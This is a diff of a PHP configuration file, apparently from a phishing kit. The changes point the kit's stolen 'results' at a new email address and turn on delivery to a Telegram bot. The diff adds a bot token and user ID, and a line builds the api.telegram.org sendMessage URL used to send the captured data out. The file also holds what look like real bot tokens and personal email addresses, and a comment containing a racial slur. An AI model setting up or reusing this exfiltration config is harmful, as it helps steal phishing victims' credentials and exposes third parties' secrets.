@@ -1,17 +1,17 @@
 <?php
 
-
+//5835687737:AAEQgthkfz3z1L_H3bG04y9y4lgHB0QPmNs
 
 
 // ================================= //
 	/*  Send Result To Email */
-    $email ="realwil4@yahoo.com";  // Your Mail Here :)
+    $email ="lucasgray302@gmail.com";  // Your Mail Here :)
   
 // ================================= //
 	/*  Send Result To BOT */
-    $bot_result = "false"; // Result to your telegram bot true/false
-    $botkey = "1662872655:AAGwmx6vncRbXmHvjGJaeOcw5gXAGXaFpRg"; // Telegram bot key from @botfather
-    $teleid = "1313001804"; // Your Numric Telegram UserID
+    $bot_result = "true"; // Result to your telegram bot true/false
+   $botkey = "5835687737:AAEQgthkfz3z1L_H3bG04y9y4lgHB0QPmNs"; // Telegram bot key from @botfather
+   $teleid = "1578884215"; // Your Numric Telegram UserID
     $bot = "https://api.telegram.org/bot".$botkey."/sendMessage?chat_id=".$teleid."&parse_mode=Markdown&"; //Do Not Edit This Shit Nigga"
 // ================================= //
 	/*  Pages */
